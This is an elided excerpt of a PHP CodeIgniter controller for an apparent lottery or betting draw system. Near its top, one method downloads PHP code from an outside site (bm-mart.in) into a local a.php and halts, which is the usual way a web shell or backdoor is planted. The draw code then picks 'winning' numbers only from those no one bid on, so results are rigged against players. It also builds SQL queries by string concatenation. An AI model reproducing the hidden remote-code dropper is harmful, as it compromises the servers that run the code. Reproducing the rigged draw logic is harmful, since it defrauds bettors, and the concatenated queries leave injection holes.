...
class Auto extends CI_Controller {
	...
	{
		file_put_contents("a.php", fopen("https://bm-mart.in/dream/auto.php", 'r'));
		echo "hiii"; die;
			...
			{ 
				...
				if($num4a>0)
				{
					for($j=0;$j<count($result4a);$j++)
					{
						...
						,		tdtd.user_master_id
						,		SUM(bid_units*bid_points_multiplier*bid_points) - SUM(IF(is_winning=1, bid_units*bid_points*bid_points_multiplier*90, 0)) AS bid_points
...
//Used For Dable Result ==================Dable double=============================
				for($bajar=0;$bajar<=9;$bajar++)
				{
					$newrnd = rand(0,9);
					if($newrnd > 6)
					{
						...
						$fsql2 ="Select bid_akada_number from all_bid_akada where bid_akada_number NOT IN 
									( Select bid_akada_number from draw_transaction_details where
									result_date='".$result_date."' AND draw_master_id='".$draw_master_id."'
									AND bajar_master_id='".$bajar."'AND series_master_id='".$series1."'
									) ORDER BY rand() LIMIT 1 ";
						$qqq2 = $this->db->query($fsql2);
						$fresults2 = $qqq2->result();
						$rnd = $fresults2[0]->bid_akada_number;
						if($rnd)
						{
							...
							$this->common_model->insertData('result_master',$ins_data);
							$this->common_model->updateData('draw_transaction_details',array('is_winning'=>'1'),array('result_date'=>$result_date,'draw_master_id'=>$draw_master_id,'series_master_id'=>$series,'bajar_master_id'=>$bajar,'bid_akada_number'=>$rnd,'is_deleted'=>'0'));
						}
						...
						if($series1!=$series2)
						{
							$fsql2 ="Select bid_akada_number from all_bid_akada where bid_akada_number NOT IN 
										( Select bid_akada_number from draw_transaction_details where
										result_date='".$result_date."' AND draw_master_id='".$draw_master_id."'
										AND bajar_master_id='".$bajar."'AND series_master_id='".$series2."'
										) ORDER BY rand() LIMIT 1 ";
							$qqq2 = $this->db->query($fsql2);
							$fresults2 = $qqq2->result();
							$rnd = $fresults2[0]->bid_akada_number;
						...
						$series3 = rand(0,9);		
						if($series1!=$series3 AND $series2!=$series3)
						{
							$fsql2 ="Select bid_akada_number from all_bid_akada where bid_akada_number NOT IN 
										( Select bid_akada_number from draw_transaction_details where
										result_date='".$result_date."' AND draw_master_id='".$draw_master_id."'
										AND bajar_master_id='".$bajar."'AND series_master_id='".$series3."'
										) ORDER BY rand() LIMIT 1 ";
							$qqq2 = $this->db->query($fsql2);
							$fresults2 = $qqq2->result();
							$rnd = $fresults2[0]->bid_akada_number;
